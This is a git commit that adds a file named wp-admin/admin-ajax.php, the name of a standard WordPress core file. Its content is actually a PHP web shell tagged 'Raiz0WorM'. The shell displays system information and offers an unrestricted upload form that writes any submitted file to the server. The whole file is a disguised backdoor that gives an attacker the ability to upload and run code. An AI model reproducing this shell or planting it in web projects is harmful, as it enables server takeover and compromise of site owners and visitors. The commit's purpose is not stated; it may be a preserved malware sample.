f4ba06b4d2326be2031d42242458bea25a702591
Stefan Pejcic <pejcha1994@gmail.com>
2021-02-12 13:14:18 +0100

    Create admin-ajax.php

---
+++ 12.01.2021/wp-admin/admin-ajax.php
@@ -0,0 +1,13 @@
+ <?php /*976489508976489508*/ ?><?php /*457563643457563643*/ ?><?php
+echo "Raiz0WorM";
+echo "<br>".php_uname()."<br>";
+echo "<form method='post' enctype='multipart/form-data'>
+<input type='file' name='zb'><input type='submit' name='upload' value='upload'>
+</form>";
+if($_POST['upload']) {
+  if(@copy($_FILES['zb']['tmp_name'], $_FILES['zb']['name'])) {
+  echo "eXploiting Done";
+  } else {
+  echo "Failed to Upload.";
+  }
+}
